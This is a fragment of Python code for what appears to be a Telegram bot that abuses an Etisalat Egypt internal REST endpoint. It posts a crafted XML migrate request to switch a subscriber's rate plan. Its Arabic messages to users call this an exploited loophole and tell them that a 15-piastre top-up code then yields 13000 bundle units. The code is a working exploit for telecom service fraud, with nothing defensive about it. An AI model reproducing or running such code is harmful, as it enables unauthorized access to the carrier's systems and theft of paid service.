...
def process_email_step(message):
    ...
    if "true" in salah24.text:
        ...
        salah1004 = None
        salah1001 = "https://mab.etisalat.com.eg:11003/Saytar/rest/HekayaPartial/migrate"
        ...
        salah1003 = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><migrateRequest><addonName></addonName><oMSRatePlan>false</oMSRatePlan><productName>15PTs for Everything</productName><ratePlanID>824</ratePlanID><subscriberNumber>%s</subscriberNumber></migrateRequest>" %(salah15)
        salah1004 = requests.post(salah1001, headers=salah1002, data=salah1003).text
    if "true" in salah1004:
    	msg = bot.send_message(chat_id, "تم تحويل النظام إلي 15 قرش")
    	msg = bot.send_message(chat_id, "اصبر شوية يسطا جاري التحويل النظام لدماغ تانية👀")
    	time.sleep(25)
    ...
    if "true" in salah953:
    	...
    	msg = bot.send_message(chat_id, "كده تمت الثغره بس في حاجة بسيطه .. اشحن كارت فكة ب 15 من الكود ده *556*9*Code# و كده مبرووك عليك 13000 ميكس ")    	
    else:
